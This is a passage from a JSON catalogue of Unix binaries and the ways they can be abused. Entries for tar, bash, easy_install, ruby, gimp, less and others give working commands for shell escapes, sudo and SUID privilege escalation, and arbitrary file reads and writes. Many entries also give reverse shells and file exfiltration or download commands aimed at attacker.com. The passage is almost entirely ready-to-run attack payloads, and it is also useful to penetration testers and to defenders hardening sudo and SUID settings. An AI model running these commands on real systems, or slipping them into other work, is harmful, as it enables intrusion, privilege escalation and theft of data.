          "code": "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "pidstat": {
    "description": "",
    "functions": {
      "command": [
        {
          "code": "COMMAND=id\npidstat -e $COMMAND\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "COMMAND=id\nsudo pidstat -e $COMMAND\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "COMMAND=id\n./pidstat -e $COMMAND\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "genisoimage": {
    "description": "The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "stdbuf": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "stdbuf -i0 /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./stdbuf -i0 /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo stdbuf -i0 /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "at": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "command": [
        {
          "code": "COMMAND=id\necho \"$COMMAND\" | at now\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lwp-download": {
    "description": "Fetch a remote file via HTTP GET request.",
    "functions": {
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "chroot": {
    "description": "",
    "functions": {
      "suid": [
        {
          "code": "./chroot / /bin/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo chroot /\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "vagrant": {
    "description": "This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "efax": {
    "description": "The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_read\n./efax -d \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xdotool": {
    "description": "This requires a running X server.",
    "functions": {
      "shell": [
        {
          "code": "xdotool exec --sync /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./xdotool exec --sync /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo xdotool exec --sync /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tic": {
    "description": "The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntic -C \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./tic -C \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "bash",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "bash -c 'enable -f ./lib.so x'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./bash -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo bash",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rtorrent": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "echo \"execute = /bin/sh,-c,\\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\nrtorrent\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "torsocks": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "torsocks /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo torsocks /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "c99": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nc99 -x c -E \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "c99 -wrapper /bin/sh,-s .",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo c99 -wrapper /bin/sh,-s .",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ln": {
    "description": "This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.",
    "functions": {
      "sudo": [
        {
          "code": "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "easy_install": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ruby": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ruby -e 'exec \"/bin/sh\"'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export LPORT=8888\nruby -run -e httpd . -p $LPORT\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "ruby -e 'puts File.read(\"file_to_read\")'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "sudo": [
        {
          "code": "sudo ruby -e 'exec \"/bin/sh\"'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ]
    }
  },
  "gimp": {
    "description": "The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.",
    "functions": {
      "shell": [
        {
          "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mtr": {
    "description": "The read file content is corrupted by error prints.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmtr --raw -F \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nm": {
    "description": "The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnm @$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./nm @$LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo nm @$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "strace": {
    "description": "",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "strace -o /dev/null /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./strace -o /dev/null /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo strace -o /dev/null /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xargs": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "xargs -a /dev/null sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "echo x | xargs -Iy sh -c 'exec sh 0<&1'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./xargs -a /dev/null sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo xargs -a /dev/null sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "less": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "less /etc/profile\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "less /etc/profile\nv:shell\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "less file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
